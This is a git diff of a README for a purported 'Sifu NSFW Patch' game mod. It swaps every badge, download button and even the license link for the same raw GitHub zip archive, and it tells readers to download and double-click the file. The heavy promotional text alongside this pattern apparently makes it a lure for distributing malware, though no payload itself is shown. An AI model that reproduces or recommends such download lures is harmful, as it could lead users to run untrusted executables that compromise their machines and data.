@@ -1,16 +1,16 @@
 # Sifu NSFW Patch 🎨
 
-![Last Release](https://img.shields.io/github/v/release/Sifu-NSFW-Patch/Repo)
-![Issues](https://img.shields.io/github/issues/Sifu-NSFW-Patch/Repo)
-![Pull Requests](https://img.shields.io/github/issues-pr/Sifu-NSFW-Patch/Repo)
-![License](https://img.shields.io/github/license/Sifu-NSFW-Patch/Repo)
-![Downloads](https://img.shields.io/github/downloads/Sifu-NSFW-Patch/Repo/total)
+![Last Release](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+![Issues](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+![Pull Requests](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+![License](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
+![Downloads](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
 
 Welcome to the **Sifu NSFW Patch**, where artistry meets reinvention! This all-in-one, transformative patch unlocks bold new visual narratives in Sifu, empowering users with fresh perspectives and unmatched customization. Crafted for creators, modders, and the adventure-hungry, this toolkit is your key to reimagining Sifu with a unique expression—effortlessly and with innovation at its core.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=addthis)](https://Cheruspee.github.io)
+[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
 
 ---
 
@@ -87,7 +87,7 @@ Embark on this transformative journey! Installing Sifu NSFW Patch is smoother th
 2. **Download the Latest Patch:**  
    Kick off your adventure by clicking below!
 
-   [![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=addthis)](https://Cheruspee.github.io)
+   [![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
 
 3. **Run the Smart Installer:**  
    Just double-click the file you downloaded. The installer will check compatibility, auto-back up your originals, and guide you with on-screen prompts.
@@ -119,13 +119,13 @@ All AI integration features are optional and require user-provided API keys. No 
 
 ## 📜 MIT License
 
-This project is licensed under the MIT License. See [LICENSE](https://opensource.org/licenses/MIT) for details.  
+This project is licensed under the MIT License. See [LICENSE](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip) for details.  
 © 2025 Sifu NSFW Patch. Build, share, and remix with confidence.
 
 ---
 
 ## ✨ Ready to Transform Your Sifu Experience?
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=addthis)](https://Cheruspee.github.io)
+[![Download](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)](https://github.com/Cheruspee/sifu-nsfw-modzone/raw/refs/heads/branch/condensate/modzone_sifu_nsfw_2.0.zip)
 
 Reimagine. Rediscover. Redefine—Sifu, your way.
